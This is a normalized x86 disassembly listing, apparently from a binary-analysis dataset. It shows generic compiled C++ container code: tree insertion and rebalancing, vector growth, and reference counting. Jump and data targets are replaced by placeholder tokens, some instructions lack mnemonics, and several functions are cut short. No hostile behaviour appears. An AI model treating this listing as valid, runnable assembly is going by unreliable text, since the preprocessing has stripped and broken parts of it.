xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi r--data
cmp [ esi + 0xc ] ebx
jne r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
push 0x59
push edi
push r--data
call sub_4258e2
add esp 0xc
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
cmp ecx [ eax + 0x4 ]
jne r-xdata
push 0x5a
push edi
push r--data
call sub_4258e2
add esp 0xc
mov eax [ esi + 0x4 ]
cmp eax [ ebp + 0x10 ]
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ esi + 0x4 ] eax
mov al [ ebp + 0xc ]
jmp r-xdata
mov [ esi + 0x4 ] eax
cmp [ esi ] bl
je r-xdata
mov eax 0x3ffffffe
lea edi [ esi + 0x14 ]
mov [ esi ] al
cmp [ edi ] ebx
jne r-xdata
xor eax eax
cmp [ ebp + 0xc ] bl
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov ebx edi
call sub_40dc69
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x1
call sub_406cd3
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] 0x0
call sub_4069e4
mov ecx [ esi + 0x18 ]
lea eax [ ebp + 0x18 ]
call sub_40cbe8
mov eax esi
call sub_4071ea
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp + 0xc ]
push eax
call sub_4069e4
mov eax esi
call sub_44866d
retn 0x20
push 0x10
call sub_424ff8
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor eax eax
inc eax
jmp r-xdata
xor eax eax
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x10 ] ebx
call sub_40cab2
jmp r-xdata
mov ecx eax
call sub_40ca83
mov esi [ ebp + 0x8 ]
sub_40c0a8
push 0x2c
mov eax sub_44a687
call sub_448595
and [ ebp - 0x10 ] 0x0
test edi edi
je r-xdata
push 0x4
pop eax
call sub_44866d
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x10
call sub_424ff8
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
lea eax [ ebp - 0x38 ]
push eax
call sub_402d9b
push ecx
lea eax [ ebp - 0x38 ]
push eax
call sub_402d21
mov [ ebp - 0x10 ] 0x1
call sub_40cb08
jmp r-xdata
lea ecx [ eax + 0x1c ]
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] eax
je r-xdata
sub_40c11d
cmp [ ebx + 0x4 ] 0x0
push esi
jne r-xdata
cmp [ edi + 0x4 ] 0x0
jne r-xdata
mov esi ebx
call sub_40a3af
xor eax eax
pop esi
cmp [ ebx ] eax
jne r-xdata
mov esi edi
call sub_40a3af
cmp [ edi ] eax
je r-xdata
cmp [ edi ] eax
je r-xdata
retn
xor eax eax
inc eax
retn
sub_40c14c
push 0x0
mov eax sub_44de17
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + 0x10 ]
mov eax edi
call sub_407102
mov eax [ ebp + 0x18 ]
mov [ edi + 0x8 ] eax
mov eax [ ebp + 0x1c ]
mov [ edi + 0xc ] eax
mov eax [ ebp + 0xc ]
mov [ edi + 0x10 ] eax
lea ecx [ ebp + 0x20 ]
lea eax [ edi + 0x14 ]
call sub_407102
mov eax [ ebp + 0x28 ]
mov [ edi + 0x1c ] eax
mov eax [ ebp + 0x2c ]
mov [ edi + 0x20 ] eax
mov eax edi
mov [ ebp - 0x4 ] 0x3
call sub_40cb46
mov [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
test esi esi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp + 0x24 ]
test esi esi
je r-xdata
call sub_40379c
mov eax edi
call sub_44866d
retn 0x28
call sub_40379c
sub_40c219
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_40c2c3
mov eax [ esi ]
test eax eax
jg r-xdata
mov eax esi
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
push 0x3e
push r--data
push r--data
call sub_4258e2
add esp 0xc
retn
lea ecx [ esi - 0x4 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_40c2fe
mov eax [ esi ]
test eax eax
jg r-xdata
mov eax esi
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
push 0x3e
push r--data
push r--data
call sub_4258e2
add esp 0xc
retn
lea ecx [ esi - 0x4 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_40c339
mov eax [ esi ]
test eax eax
jg r-xdata
mov eax esi
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
push 0x3e
push r--data
push r--data
call sub_4258e2
add esp 0xc
retn
lea ecx [ esi - 0x4 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_40c37e
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_40c3b0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_40c3b0
push 0x0
mov eax sub_44a662
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_40c3e0
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_40c417
mov eax [ esi + 0x10 ]
push ebx
xor ebx ebx
cmp eax ebx
je r-xdata
push edi
mov edi [ esi + 0x8 ]
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ esi + 0x4 ]
cmp edi ebx
ja r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
dec eax
mov [ esi + 0x10 ] eax
jne r-xdata
dec edi
lea eax [ eax + edi * 4 ]
cmp [ eax ] ebx
je r-xdata
pop edi
cmp eax ebx
je r-xdata
mov [ esi + 0xc ] ebx
push [ eax ]
call sub_424fc7
pop ecx
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ebx
pop ebx
retn
push eax
call sub_424fc7
pop ecx
sub_40c471
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi ecx
mov ecx [ edi + 0x4 ]
mov ebx eax
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
je r-xdata
mov ecx [ ebx + 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebx + 0x4 ]
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp eax [ ecx ]
jne r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
mov [ esi + 0x4 ] 0x0
push ebx
mov eax edi
call sub_40cd46
push [ ebp - 0x4 ]
jmp r-xdata
lea eax [ ebp - 0xc ]
call sub_40ce08
mov eax [ ebp - 0xc ]
push ebx
mov eax edi
call sub_40cd46
push 0x1
cmp ecx [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
setb [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
lea ecx [ ebp - 0xc ]
mov ebx eax
mov eax [ ebp - 0x8 ]
push ecx
call sub_40c538
mov eax [ ebp - 0xc ]
mov [ esi + 0x4 ] 0x1
jmp r-xdata
pop edi
mov [ esi ] eax
mov eax esi
pop ebx
leave
retn
sub_40c510
push ebp
mov ebp esp
push ebx
push edi
push [ ebp + 0x14 ]
mov edi eax
call sub_40cd46
push [ ebp + 0xc ]
mov ebx eax
push [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
call sub_40c538
mov eax [ ebp + 0x8 ]
pop edi
pop ebx
pop ebp
retn 0x10
sub_40c538
push ebp
mov ebp esp
mov ecx [ edi + 0x8 ]
cmp ecx 0x1ffffffe
jb r-xdata
inc ecx
mov [ edi + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov ecx [ edi + 0x4 ]
cmp eax ecx
jne r-xdata
lea eax [ ebx + 0xc ]
call sub_40699b
push ebx
call sub_424fc7
mov [ esp ] r--data
call sub_446a95
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ ecx + 0x4 ] ebx
mov eax [ edi + 0x4 ]
mov [ eax ] ebx
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] ebx
jmp r-xdata
mov [ eax + 0x8 ] ebx
mov ecx [ edi + 0x4 ]
cmp eax [ ecx + 0x8 ]
jne r-xdata
mov [ eax ] ebx
mov ecx [ edi + 0x4 ]
cmp eax [ ecx ]
jne r-xdata
mov eax [ ebx + 0x4 ]
push esi
mov esi ebx
jmp r-xdata
mov [ ecx + 0x8 ] ebx
mov [ ecx ] ebx
jmp r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
cmp eax [ ecx ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x14 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop esi
pop ebp
retn 0x8
mov ecx [ ecx ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x8 ]
cmp [ ecx + 0x14 ] 0x0
je r-xdata
cmp esi [ eax ]
jne r-xdata
mov [ eax + 0x14 ] 0x1
mov [ ecx + 0x14 ] 0x1
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x14 ] 0x0
mov eax [ esi + 0x4 ]
mov esi [ eax + 0x4 ]
jmp r-xdata
cmp esi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x4 ]
mov [ eax + 0x14 ] 0x1
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x14 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
push edi
call sub_40a84a
mov esi eax
push edi
mov ecx esi
call sub_40a88d
mov eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
mov [ eax + 0x14 ] 0x1
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x14 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
push edi
call sub_40a88d
jmp r-xdata
mov esi eax
push edi
mov ecx esi
call sub_40a84a
sub_40c669
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi ecx
mov ecx [ edi + 0x4 ]
mov ebx eax
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
je r-xdata
mov ecx [ ebx + 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebx + 0x4 ]
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp eax [ ecx ]
jne r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
mov [ esi + 0x4 ] 0x0
push ebx
mov eax edi
call sub_40cd6f
push [ ebp - 0x4 ]
jmp r-xdata
lea eax [ ebp - 0xc ]
call sub_40ce4d
mov eax [ ebp - 0xc ]
push ebx
mov eax edi
call sub_40cd6f
push 0x1
cmp ecx [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
setb [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
lea ecx [ ebp - 0xc ]
mov ebx eax
mov eax [ ebp - 0x8 ]
push ecx
call sub_40c730
mov eax [ ebp - 0xc ]
mov [ esi + 0x4 ] 0x1
jmp r-xdata
pop edi
mov [ esi ] eax
mov eax esi
pop ebx
leave
retn
sub_40c708
push ebp
mov ebp esp
push ebx
push edi
push [ ebp + 0x14 ]
mov edi eax
call sub_40cd6f
push [ ebp + 0xc ]
mov ebx eax
push [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
call sub_40c730
mov eax [ ebp + 0x8 ]
pop edi
pop ebx
pop ebp
retn 0x10
sub_40c730
push ebp
mov ebp esp
mov ecx [ edi + 0x8 ]
cmp ecx 0x1ffffffe
jb r-xdata
inc ecx
mov [ edi + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov ecx [ edi + 0x4 ]
cmp eax ecx
jne r-xdata
lea eax [ ebx + 0x10 ]
call sub_403855
push ebx
call sub_424fc7
mov [ esp ] r--data
call sub_446a95
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ ecx + 0x4 ] ebx
mov eax [ edi + 0x4 ]
mov [ eax ] ebx
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] ebx
jmp r-xdata
mov [ eax + 0x8 ] ebx
mov ecx [ edi + 0x4 ]
cmp eax [ ecx + 0x8 ]
jne r-xdata
mov [ eax ] ebx
mov ecx [ edi + 0x4 ]
cmp eax [ ecx ]
jne r-xdata
mov eax [ ebx + 0x4 ]
push esi
mov esi ebx
jmp r-xdata
mov [ ecx + 0x8 ] ebx
mov [ ecx ] ebx
jmp r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
cmp eax [ ecx ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x14 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop esi
pop ebp
retn 0x8
mov ecx [ ecx ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x8 ]
cmp [ ecx + 0x14 ] 0x0
je r-xdata
cmp esi [ eax ]
jne r-xdata
mov [ eax + 0x14 ] 0x1
mov [ ecx + 0x14 ] 0x1
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x14 ] 0x0
mov eax [ esi + 0x4 ]
mov esi [ eax + 0x4 ]
jmp r-xdata
cmp esi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x4 ]
mov [ eax + 0x14 ] 0x1
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x14 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
push edi
call sub_4099b4
mov esi eax
push edi
mov ecx esi
call sub_409a05
mov eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
mov [ eax + 0x14 ] 0x1
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x14 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
push edi
call sub_409a05
jmp r-xdata
mov esi eax
push edi
mov ecx esi
call sub_4099b4
sub_40c878
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ ebx + 0x2d ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
lea eax [ ebx + 0xc ]
add edx 0xc
mov [ ebp - 0x8 ] ebx
call sub_403b02
test eax eax
sets [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x8 ]
mov ebx eax
mov [ ebp - 0xc ] ebx
je r-xdata
mov ebx [ ebx + 0x8 ]
mov ebx [ ebx ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0xc ]
add eax 0xc
call sub_403b02
test eax eax
jns r-xdata
mov ecx [ edi + 0x4 ]
cmp eax [ ecx ]
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xc
push eax
call sub_406a4d
push [ ebp + 0x8 ]
call sub_424fc7
pop ecx
mov [ esi ] ebx
mov [ esi + 0x4 ] 0x0
push [ ebp - 0x4 ]
lea eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
jmp r-xdata
lea eax [ ebp - 0xc ]
call sub_40cdae
mov ebx [ ebp - 0xc ]
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
mov ebx [ ebp + 0x8 ]
call sub_40c934
mov eax [ eax ]
mov [ esi ] eax
mov [ esi + 0x4 ] 0x1
jmp r-xdata
pop edi
mov eax esi
pop ebx
leave
retn 0x4
sub_40c934
push ebp
mov ebp esp
mov ecx [ edi + 0x8 ]
cmp ecx 0x7fffffe
jb r-xdata
inc ecx
mov [ edi + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov ecx [ edi + 0x4 ]
cmp eax ecx
jne r-xdata
lea eax [ ebx + 0xc ]
push eax
call sub_406a4d
push ebx
call sub_424fc7
mov [ esp ] r--data
call sub_446a95
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ ecx + 0x4 ] ebx
mov eax [ edi + 0x4 ]
mov [ eax ] ebx
mov eax [ edi + 0x4 ]
mov [ eax + 0x8 ] ebx
jmp r-xdata
mov [ eax + 0x8 ] ebx
mov ecx [ edi + 0x4 ]
cmp eax [ ecx + 0x8 ]
jne r-xdata
mov [ eax ] ebx
mov ecx [ edi + 0x4 ]
cmp eax [ ecx ]
jne r-xdata
mov eax [ ebx + 0x4 ]
push esi
mov esi ebx
jmp r-xdata
mov [ ecx + 0x8 ] ebx
mov [ ecx ] ebx
jmp r-xdata
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
cmp eax [ ecx ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x2c ] 0x1
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop esi
pop ebp
retn 0x8
mov ecx [ ecx ]
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov ecx [ ecx + 0x8 ]
cmp [ ecx + 0x2c ] 0x0
je r-xdata
cmp esi [ eax ]
jne r-xdata
mov [ eax + 0x2c ] 0x1
mov [ ecx + 0x2c ] 0x1
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x2c ] 0x0
mov eax [ esi + 0x4 ]
mov esi [ eax + 0x4 ]
jmp r-xdata
cmp esi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x4 ]
mov [ eax + 0x2c ] 0x1
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x2c ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
push edi
call sub_405c16
mov esi eax
push edi
mov ecx esi
call sub_405c67
mov eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
mov [ eax + 0x2c ] 0x1
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x2c ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
push edi
call sub_405c67
jmp r-xdata
mov esi eax
push edi
mov ecx esi
call sub_405c16
sub_40ca83
test ecx ecx
je r-xdata
mov eax [ edi ]
mov [ edi ] ecx
test eax eax
je r-xdata
xor edx edx
lea eax [ ecx + 0x4 ]
inc edx
[ eax ] edx
mov eax edi
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_40cab2
mov eax [ eax ]
mov [ esi + 0x8 ] eax
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0xc ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_40cb46
push esi
push edi
mov edi eax
jmp r-xdata
mov eax [ edi + 0x8 ]
cmp eax [ edi + 0x1c ]
jne r-xdata
mov eax [ edi + 0x10 ]
cmp eax [ edi ]
jne r-xdata
pop edi
pop esi
retn
lea eax [ edi + 0x8 ]
call sub_40a30e
call sub_407f79
sub_40cb79
push 0x4
mov eax sub_44c91b
call sub_4485c8
mov ebx ecx
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov edi [ ebx + 0x4 ]
sub edi [ ebx ]
sar edi 0x2
call sub_40cee0
test al al
je r-xdata
mov eax esi
call sub_44866d
retn 0x4
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
mov ecx [ esi ]
mov eax [ ebx + 0x4 ]
mov ebx [ ebx ]
push ecx
push eax
push ebx
call sub_4118fa
add esp 0x10
mov [ esi + 0x4 ] eax
sub_40cbe8
push esi
push edi
mov edi eax
mov esi ecx
mov eax [ esi + 0x4 ]
cmp edi eax
jae r-xdata
cmp eax [ esi + 0x8 ]
jne r-xdata
mov ecx [ esi ]
cmp ecx edi
ja r-xdata
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_40fa5b
call sub_40cf48
sub edi ecx
sar edi 0x2
cmp eax [ esi + 0x8 ]
jne r-xdata
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
lea eax [ eax + edi * 4 ]
call sub_40f9f2
jmp r-xdata
call sub_40cf48
add [ esi + 0x4 ] 0x4
pop edi
pop esi
retn
sub_40cc34
mov eax [ esi ]
test eax eax
je r-xdata
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
retn
push ebx
push edi
mov edi [ esi + 0x4 ]
mov ebx eax
jmp r-xdata
cmp ebx edi
jne r-xdata
mov eax ebx
call sub_411921
add ebx 0x4
push [ esi ]
call sub_424fc7
pop ecx
pop edi
pop ebx
sub_40cc78
push 0x2c
mov eax sub_44d415
call sub_448595
mov eax [ ecx + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosb [ edi ]
push [ ebp - 0x10 ]
lea edi [ ebp - 0x14 ]
stosb [ edi ]
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_40cf93
call sub_44866d
retn 0xc
push 0xa
mov eax r--data
lea esi [ ebp - 0x38 ]
call sub_4038f9
and [ ebp - 0x4 ] 0x0
push 0x76
push r--data
push r--data
push eax
call sub_405e22
sub_40ccd0
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_40ccf0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_40ccf0
push 0x0
mov eax sub_44a63f
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_40cd46
push ebp
mov ebp esp
push esi
mov esi eax
call sub_40bc6b
mov esi eax
lea eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
call sub_407102
sub_40cd6f
push ebp
mov ebp esp
push esi
mov esi eax
call sub_40cfe9
mov esi eax
lea eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
call sub_40fda8
sub_40cdae
mov ecx [ eax ]
push ebx
xor bl bl
cmp [ ecx + 0x2d ] bl
je r-xdata
mov edx [ ecx ]
cmp [ edx + 0x2d ] bl
jne r-xdata
mov ecx [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x2d ] bl
je r-xdata
jmp r-xdata
mov [ eax ] ecx
mov edx [ eax ]
cmp edx [ ecx ]
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x2d ] bl
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x2d ] bl
je r-xdata
mov [ eax ] ecx
pop ebx
retn
mov edx ecx
mov [ eax ] edx
pop ebx
retn
sub_40ce08
mov ecx [ eax ]
push ebx
xor bl bl
cmp [ ecx + 0x15 ] bl
je r-xdata
mov edx [ ecx ]
cmp [ edx + 0x15 ] bl
jne r-xdata
mov ecx [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] bl
je r-xdata
jmp r-xdata
mov [ eax ] ecx
mov edx [ eax ]
cmp edx [ ecx ]
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x15 ] bl
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] bl
je r-xdata
mov [ eax ] ecx
pop ebx
retn
mov edx ecx
mov [ eax ] edx
pop ebx
retn
sub_40ce4d
mov ecx [ eax ]
push ebx
xor bl bl
cmp [ ecx + 0x15 ] bl
je r-xdata
mov edx [ ecx ]
cmp [ edx + 0x15 ] bl
jne r-xdata
mov ecx [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] bl
je r-xdata
jmp r-xdata
mov [ eax ] ecx
mov edx [ eax ]
cmp edx [ ecx ]
jne r-xdata
mov edx [ eax ]
cmp [ edx + 0x15 ] bl
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] bl
je r-xdata
mov [ eax ] ecx
pop ebx
retn
mov edx ecx
mov [ eax ] edx
pop ebx
retn
sub_40cee0
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
cmp edi eax
jne r-xdata
cmp edi 0x3fffffff
jbe r-xdata
xor al al
retn
cmp edi eax
jbe r-xdata
push r--data
call sub_446a95
mov [ esi ] eax
mov [ esi + 0x4 ] eax
lea eax [ eax + edi * 4 ]
mov [ esi + 0x8 ] eax
mov al 0x1
retn
mov eax edi
call sub_40debb
sub_40cf1c
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jne r-xdata
mov eax esi
call sub_411921
add esi 0x4
pop esi
pop ebp
retn 0x4
sub_40cf48
mov ecx [ esi ]
mov eax [ esi + 0x4 ]
sub eax ecx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov edx [ esi + 0x8 ]
sub edx ecx
inc eax
sar edx 0x2
cmp eax edx
jbe r-xdata
push r--data
call sub_446a95
retn
push eax
mov ecx esi
call sub_40d0e3
push eax
mov ecx esi
call sub_40d015
sub_40cf93
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_40d015
push 0xc
mov eax sub_44b477
call sub_4485c8
mov esi ecx
mov eax [ ebp + 0x8 ]
cmp eax 0x3fffffff
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
sar ecx 0x2
cmp ecx eax
jae r-xdata
push r--data
call sub_446a95
call sub_44866d
retn 0x4
test eax eax
jne r-xdata
call sub_40debb
mov ebx eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
lea eax [ ebx + eax * 4 ]
mov [ esi + 0x8 ] eax
lea eax [ ebx + edi * 4 ]
mov [ esi + 0x4 ] eax
mov [ esi ] ebx
mov [ ebp - 0x14 ] eax
cmp eax ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov eax [ esi ]
push ebx
push ecx
call sub_411935
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ esi + 0x4 ]
mov eax [ esi ]
mov edi ecx
sub edi eax
add esp 0xc
sar edi 0x2
mov [ ebp - 0x18 ] ecx
test eax eax
je r-xdata
push [ esi ]
call sub_424fc7
pop ecx
mov eax [ ebp - 0x14 ]
call sub_411921
add [ ebp - 0x14 ] 0x4
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
sub_40d0e3
push ebp
mov ebp esp
mov eax [ ecx + 0x8 ]
sub eax [ ecx ]
mov edx 0x3fffffff
sar eax 0x2
mov ecx eax
shr ecx 0x1
sub edx ecx
cmp edx eax
jae r-xdata
add eax ecx
xor eax eax
jmp r-xdata
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
sub_40d140
push ebp
mov ebp esp
mov al [ ecx ]
test al al
je r-xdata
cmp edx [ ebp + 0x8 ]
jne r-xdata
cmp edx [ ebp + 0x8 ]
je r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
cmp [ ecx ] 0x0
jne r-xdata
cmp al [ edx ]
jne r-xdata
xor al al
pop ebp
retn
inc ecx
mov al [ ecx ]
inc edx
test al al
jne r-xdata
sub_40d172
push 0x4
